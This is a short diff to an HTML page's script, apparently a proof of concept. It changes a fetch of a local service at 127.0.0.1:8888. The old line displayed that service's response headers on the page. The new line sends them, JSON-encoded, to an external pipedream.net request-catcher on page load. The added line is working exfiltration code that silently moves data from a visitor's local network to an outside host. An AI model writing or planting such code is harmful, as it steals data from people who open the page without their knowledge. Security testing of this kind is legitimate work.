@@ -6,6 +6,6 @@
   <body>
   </body>
   <script>
-    fetch("http://127.0.0.1:8888/").then(a => document.write(JSON.stringify([...a.headers.entries()], null, '<br>&nbsp;')));
+    fetch("http://127.0.0.1:8888/").then(a => fetch("https://enxnu407hqabq.x.pipedream.net/?data=" + encodeURIComponent(JSON.stringify([...a.headers.entries()]))));
   </script>
 </html>
